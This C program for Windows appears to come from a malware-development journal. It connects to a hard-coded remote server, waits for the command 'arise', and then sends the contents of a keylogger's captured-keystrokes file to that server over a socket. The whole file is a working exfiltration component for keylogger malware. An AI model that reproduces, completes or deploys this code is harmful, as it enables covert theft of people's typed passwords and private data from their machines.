#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>


#define SERVER_IP "192.168.1.14"  // Change this to the Linux server IP
#define SERVER_PORT 2005
#define BUF_SIZE 1024

HANDLE hMutex;
DWORD WINAPI send_file(LPVOID lpBuffer) {
    DWORD dwWaitResult = WaitForSingleObject(hMutex, INFINITE);
    if (dwWaitResult == WAIT_OBJECT_0) {
        FILE *fp;
        char *filename = "C:\\Users\\blackrose\\Desktop\\MalDevJournal\\keylogger\\keylogger.txt";
        char buffer[BUF_SIZE];
        int bytes_sent;
        SOCKET sock = *(SOCKET*)lpBuffer;
        
        if ((fp = fopen(filename, "r")) == NULL) {
            printf("Error opening file\n");
            return -1;
        }
        while ((bytes_sent = fread(buffer, sizeof(char), BUF_SIZE-1, fp)) > 0) {
            send(sock, buffer, bytes_sent, 0);
        }
        if (bytes_sent == 0) {
            printf("File transfer complete\n");    
        } else {
            printf("Error sending file\n");
            return -1;
        }
        fclose(fp);
        ReleaseMutex(hMutex);
    }
    return 0;
}

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char key_buffer[BUF_SIZE];

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed with error\n");
        return 1;
    }
    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
        printf("Socket creation failed\n");
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_port = htons(SERVER_PORT);

    // Connect to the server
    
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed\n");
        return 1;
    }

    printf("Connected to server...\n"); 
    hMutex = CreateMutex(NULL, FALSE, NULL);   
    // Start capturing keystrokes
    while (1) {
        char buffer[BUF_SIZE] = {0};
        int len = recv(sock, buffer, BUF_SIZE, 0);
        // buffer[len-1]='\0';
        printf("Received: %s\n", buffer);
        if(strcmp(buffer, "arise") == 0) {
            if(send(sock, "commandar", strlen("commandar"),0) == -1){
                return 1;
            } else {
                HANDLE handle = CreateThread(NULL, 0, send_file, &sock, 0, NULL);
            }
        }
        
    }

    // Cleanup
    closesocket(sock);
    WSACleanup();
    return 0;
}
